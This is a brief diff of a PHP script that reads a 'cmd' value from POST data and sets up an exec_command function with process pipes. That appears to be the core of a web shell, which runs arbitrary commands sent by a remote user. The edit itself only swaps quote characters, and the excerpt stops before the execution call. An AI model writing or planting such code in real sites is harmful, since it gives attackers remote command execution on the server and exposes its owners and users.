@@ -1,7 +1,7 @@
 <?php 
 	
 	if(isset($_POST["cmd"])){
-    	$cmd = ($_POST['cmd']);
+    	$cmd = ($_POST["cmd"]);
 	
 	function exec_command($command)
 		{$descriptorspec = array(0 => array("pipe", "r"),1 => array("pipe", "w"),2 => array("file", "error-output.txt", "a"));
